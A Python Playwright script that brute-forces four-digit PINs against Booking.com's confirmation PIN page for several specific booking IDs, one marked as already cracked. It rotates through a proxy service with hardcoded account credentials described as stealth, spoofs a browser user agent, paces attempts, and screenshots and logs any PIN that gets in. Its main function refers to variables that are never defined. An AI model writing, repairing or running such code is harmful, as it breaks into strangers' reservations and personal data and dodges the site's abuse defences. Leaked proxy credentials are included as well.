"""
🎯 FIXED SKIPPED PIN RECOVERY MISSION
Boss reported PIN not filling up in form - Enhanced with multiple selector strategies
"""

import asyncio
from playwright.sync_api import sync_playwright
import csv
from datetime import datetime
import time

# 🎯 BOSS'S FOUR TARGET BOOKING IDs (A, B, C, D)
BOOKING_IDS = {
    "A": "5727559423",  # PROVEN WORKING - PIN 2390 confirmed
    "B": "6160911170",  # Previously tested partially
    "C": "5830944764",  # Previously tested partially  
    "D": "TBD_ID_4"     # Boss will provide 4th ID
}

# 🍀 PROFESSOR JOHNNY'S LUCKY 50 PINS FOR ALL BOOKING IDs  
MASTER_PIN_LIST = [
    "0295", "1842", "0922", "1781", "8856", "2634", "7674", "7628", 
    "3260", "9027", "4627", "8031", "2383", "5415", "1008", "4123", 
    "1807", "9854", "5072", "5453", "9025", "4319", "7682", "9309", 
    "9265", "4163", "1678", "2275", "4072", "6490", "2108", "1768", 
    "5828", "4816", "6894", "1424", "3660", "9127", "3031", "8884", 
    "7034", "6012", "0342", "8473", "9210", "1601", "7212", "8596", 
    "7295", "9656"
]

# 📊 TESTING PROGRESS TRACKER - Which PINs have been tested for each booking ID
TESTED_PINS_TRACKER = {
    "A": {  # Booking ID: 5727559423
        "tested_pins": ["2540", "1476", "6704", "9921", "2390", "5167", "7098"],  # From previous run
        "success_pins": ["2390"],  # CONFIRMED WINNER
        "failure_pins": ["2540", "1476", "6704", "9921", "5167", "7098"],
        "remaining_pins": [pin for pin in MASTER_PIN_LIST if pin not in ["2540", "1476", "6704", "9921", "2390", "5167", "7098"]],
        "total_tested": 7,
        "total_remaining": 43
    },
    "B": {  # Booking ID: 6160911170 
        "tested_pins": [],  # Need to check previous results
        "success_pins": [],
        "failure_pins": [],
        "remaining_pins": MASTER_PIN_LIST.copy(),
        "total_tested": 0,
        "total_remaining": 50
    },
    "C": {  # Booking ID: 5830944764
        "tested_pins": [],  # Need to check previous results  
        "success_pins": [],
        "failure_pins": [],
        "remaining_pins": MASTER_PIN_LIST.copy(),
        "total_tested": 0,
        "total_remaining": 50
    },
    "D": {  # Booking ID: TBD_ID_4
        "tested_pins": [],
        "success_pins": [],
        "failure_pins": [],
        "remaining_pins": MASTER_PIN_LIST.copy(),
        "total_tested": 0,
        "total_remaining": 50
    }
}

# 🎯 CURRENT MISSION TARGET
CURRENT_TARGET = "A"  # Start with proven working booking ID

def log_result(booking_id, pin, status, url=""):
    """Log results to CSV file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('skipped_pins_recovery.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, "RECOVERY_AGENT", booking_id, pin, status, url])

def update_progress_tracker(booking_letter, pin, status):
    """Update the progress tracker with test results"""
    global TESTED_PINS_TRACKER
    
    if pin not in TESTED_PINS_TRACKER[booking_letter]["tested_pins"]:
        TESTED_PINS_TRACKER[booking_letter]["tested_pins"].append(pin)
        TESTED_PINS_TRACKER[booking_letter]["total_tested"] += 1
        TESTED_PINS_TRACKER[booking_letter]["total_remaining"] -= 1
    
    if status == "SUCCESS" and pin not in TESTED_PINS_TRACKER[booking_letter]["success_pins"]:
        TESTED_PINS_TRACKER[booking_letter]["success_pins"].append(pin)
    elif status == "FAILURE" and pin not in TESTED_PINS_TRACKER[booking_letter]["failure_pins"]:
        TESTED_PINS_TRACKER[booking_letter]["failure_pins"].append(pin)
    
    # Remove from remaining if it's there
    if pin in TESTED_PINS_TRACKER[booking_letter]["remaining_pins"]:
        TESTED_PINS_TRACKER[booking_letter]["remaining_pins"].remove(pin)

def print_progress_summary():
    """Print comprehensive progress summary for all booking IDs"""
    print("\n📊 COMPREHENSIVE PROGRESS SUMMARY")
    print("=" * 80)
    
    for letter, booking_id in BOOKING_IDS.items():
        tracker = TESTED_PINS_TRACKER[letter]
        print(f"\n🎯 BOOKING {letter}: {booking_id}")
        print(f"   📈 Progress: {tracker['total_tested']}/50 PINs tested ({tracker['total_remaining']} remaining)")
        print(f"   🌟 SUCCESS: {len(tracker['success_pins'])} PINs - {tracker['success_pins']}")
        print(f"   ❌ FAILURE: {len(tracker['failure_pins'])} PINs")
        
        if tracker['total_tested'] == 0:
            print(f"   📋 Status: 🆕 NOT STARTED")
        elif tracker['total_remaining'] == 0:
            print(f"   📋 Status: ✅ COMPLETED")
        else:
            completion_pct = (tracker['total_tested'] / 50) * 100
            print(f"   📋 Status: 🔄 IN PROGRESS ({completion_pct:.1f}% complete)")

def get_next_pin_to_test(booking_letter):
    """Get the next PIN to test for a specific booking ID"""
    remaining = TESTED_PINS_TRACKER[booking_letter]["remaining_pins"]
    if remaining:
        return remaining[0]
    return None

def debug_page_elements(page):
    """Debug function to see what form elements are available"""
    try:
        print("🔍 DEBUGGING: Available input elements on page...")
        inputs = page.query_selector_all('input')
        for i, inp in enumerate(inputs):
            try:
                tag_attrs = {
                    'type': inp.get_attribute('type'),
                    'name': inp.get_attribute('name'),
                    'placeholder': inp.get_attribute('placeholder'),
                    'id': inp.get_attribute('id'),
                    'class': inp.get_attribute('class')
                }
                print(f"  Input {i}: {tag_attrs}")
            except:
                print(f"  Input {i}: Could not read attributes")
    except Exception as e:
        print(f"🔍 Debug failed: {e}")

def fill_field_with_retry(page, field_selectors, value, field_name):
    """Try multiple selectors to fill a field with retry logic"""
    for selector in field_selectors:
        try:
            print(f"🔍 Trying {field_name} selector: {selector}")
            page.wait_for_selector(selector, timeout=10000)
            # Use page.fill() directly instead of ElementHandle methods
            page.fill(selector, "")  # Clear field
            page.fill(selector, value)  # Fill with value
            print(f"✅ Successfully filled {field_name}: {value}")
            return True
        except Exception as e:
            print(f"❌ Failed with selector {selector}: {e}")
            continue
    return False

def test_pin(page, booking_id, pin):
    """Test a single PIN for a booking ID with enhanced field filling"""
    try:
        print(f"🔁 Testing PIN: {pin} for booking {booking_id}")
        
        # Navigate to booking confirmation page
        print("🌐 Opening booking.com...")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load")
        
        print("⏳ Waiting for page to load completely...")
        page.wait_for_load_state("networkidle", timeout=20000)
        print("✅ Page loaded completely!")
        
        # Wait extra time for dynamic content
        time.sleep(3)
        
        # Debug: See what form elements are available
        debug_page_elements(page)
        
        # Multiple selectors for booking ID field
        booking_selectors = [
            'input[placeholder="e.g. 1234567890"]',
            'input[name="bookingnr"]',
            'input[data-testid="booking-number"]',
            'input[id*="booking"]',
            'input[class*="booking"]'
        ]
        
        # Multiple selectors for PIN field
        pin_selectors = [
            'input[placeholder="e.g. 1234"]',
            'input[name="pin"]',
            'input[data-testid="pin"]',
            'input[id*="pin"]',
            'input[class*="pin"]'
        ]
        
        # Try to fill booking ID with multiple strategies
        print("📝 Looking for booking ID field...")
        if not fill_field_with_retry(page, booking_selectors, booking_id, "booking ID"):
            print("💥 Failed to find booking ID field with any selector")
            raise Exception("Cannot find booking ID field")
        
        # Try to fill PIN with multiple strategies
        print(f"🔐 Looking for PIN field...")
        if not fill_field_with_retry(page, pin_selectors, pin, "PIN"):
            print("💥 Failed to find PIN field with any selector")
            raise Exception("Cannot find PIN field")
        
        # Click Continue button with multiple strategies
        print("🔍 Looking for Continue button...")
        continue_selectors = [
            'button:has-text("Continue")',
            'button[type="submit"]',
            'input[type="submit"]',
            'button[data-testid="submit"]',
            'button[class*="submit"]'
        ]
        
        clicked = False
        for selector in continue_selectors:
            try:
                page.wait_for_selector(selector, timeout=5000)
                print(f"✅ Clicking button with selector: {selector}")
                page.click(selector)
                clicked = True
                break
            except:
                continue
        
        if not clicked:
            print("💥 Failed to find submit button")
            raise Exception("Cannot find submit button")
        
        # Wait for results with ENHANCED SUCCESS DETECTION
        print("⏳ Waiting for results...")
        time.sleep(5)  # Give time for processing
        
        # CRITICAL: Use proven success detection from boss_ai_playwright_pin1.py
        try:
            page.wait_for_function("""
                () => {
                    // Check if URL contains success indicator
                    const urlChanged = window.location.href.includes('unique_order_id') || 
                                     window.location.href.includes('booking_details') ||
                                     window.location.href.includes('confirmation') ||
                                     window.location.href.includes('/help/reservation') ||
                                     window.location.href !== 'https://secure.booking.com/help/confirmation_pin_auth';
                    
                    // Check if error banner appears
                    const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                      document.querySelector('[class*="error"]') !== null ||
                                      document.querySelector('.alert-danger') !== null;
                    
                    return urlChanged || errorBanner;
                }
            """, timeout=30000)
        except:
            print("⚠️ No clear result after 30s, checking current state...")
        
        current_url = page.url
        print(f"🔍 Current URL: {current_url}")
        
        # ENHANCED: Check for SUCCESS first with multiple indicators
        if (current_url != "https://secure.booking.com/help/confirmation_pin_auth" and
            "help/confirmation_pin_auth" not in current_url):
            status = "SUCCESS"
            print(f"🎉🎉🎉 SUCCESS! PIN {pin} is CORRECT for booking {booking_id}! 🎉🎉🎉")
            print(f"🌟 WINNING URL: {current_url}")
            page.screenshot(path=f"SUCCESS_{booking_id}_{pin}.png")
        else:
            # Check for error elements on page
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            if len(error_elements) > 0:
                status = "FAILURE"
                print(f"❌ PIN {pin} is INCORRECT for booking {booking_id} (error banner detected)")
            else:
                # Check page content for error messages
                page_text = page.content().lower()
                if "incorrect" in page_text or "wrong" in page_text or "invalid" in page_text:
                    status = "FAILURE"
                    print(f"❌ PIN {pin} is INCORRECT for booking {booking_id}")
                else:
                    status = "UNKNOWN"
                    print(f"❓ PIN {pin} gave unexpected result for booking {booking_id}")
        
        log_result(booking_id, pin, status, current_url)
        return status
        
    except Exception as e:
        print(f"💥 Error testing PIN {pin} with booking {booking_id}: {e}")
        log_result(booking_id, pin, "EXCEPTION", "")
        return "EXCEPTION"

def main():
    """Main execution function - FIXED SUCCESS DETECTION"""
    print("🎯 BOSS'S PROVEN SUCCESS MISSION - BOOKING 5727559423")
    print("🌟 Testing confirmed working booking ID with Boss's PINs")
    print("🔧 ENHANCED SUCCESS DETECTION - Will not miss any wins!")
    print("🚀 Starting Playwright...")
    
    with sync_playwright() as p:
        # Launch browser with proxy
        browser = p.chromium.launch(
            headless=False,
            proxy={
                "server": "https://pr.oxylabs.io:7777",
                "username": "customer-oxy1p_hnzsA",
                "password": "oxy1p_hnzsA1"
            }
        )
        
        print("🛡️ STEALTH MODE: Proxy configured - https://pr.oxylabs.io:7777")
        
        context = browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = context.new_page()
        
        print("🌐 Browser launched with PROXY STEALTH!")
        print("📄 New page created with stealth protection")
        
        # Test Boss's proven PINs for confirmed working booking ID
        print(f"\n🎯 TESTING BOSS'S BOOKING ID: {TARGET_BOOKING_ID}")
        print("=" * 60)
        success_count = 0
        failure_count = 0
        unknown_count = 0
        exception_count = 0
        success_pins = []
        
        for i, pin in enumerate(boss_proven_pins, 1):
            print(f"\n🔁 [{i}/{len(boss_proven_pins)}] Testing PIN: {pin} for booking {TARGET_BOOKING_ID}")
            
            # Highlight the confirmed winner
            if pin == "2390":
                print("🌟🌟🌟 TESTING BOSS'S CONFIRMED WINNER PIN 2390! 🌟🌟🌟")
            
            result = test_pin(page, TARGET_BOOKING_ID, pin)
            
            if result == "SUCCESS":
                success_count += 1
                success_pins.append(pin)
                print(f"🎉 CONFIRMED SUCCESS PIN: {pin}")
                print("� CELEBRATING SUCCESS! Pausing 30 seconds...")
                time.sleep(30)  # Pause to celebrate success
            elif result == "FAILURE":
                failure_count += 1
            elif result == "UNKNOWN":
                unknown_count += 1
            else:
                exception_count += 1
            
            print("⏳ Waiting 7s before next PIN...")
            time.sleep(7)
        
        print(f"\n📊 BOSS'S PROVEN MISSION RESULTS:")
        print("=" * 60)
        print(f"🎯 Booking ID: {TARGET_BOOKING_ID}")
        print(f"🔢 Total PINs tested: {len(boss_proven_pins)}")
        print(f"🌟 SUCCESS count: {success_count}")
        print(f"❌ FAILURE count: {failure_count}")
        print(f"❓ UNKNOWN count: {unknown_count}")
        print(f"💥 EXCEPTION count: {exception_count}")
        
        if success_pins:
            print(f"\n🎉 WINNING PINs CONFIRMED:")
            for pin in success_pins:
                print(f"  � PIN: {pin}")
            print(f"\n🎊 MISSION STATUS: {len(success_pins)} SUCCESS PIN(S) CONFIRMED!")
        else:
            print(f"\n⚠️ MISSION STATUS: NO SUCCESS DETECTED - INVESTIGATING DETECTION LOGIC!")
        
        browser.close()

if __name__ == "__main__":
    main()
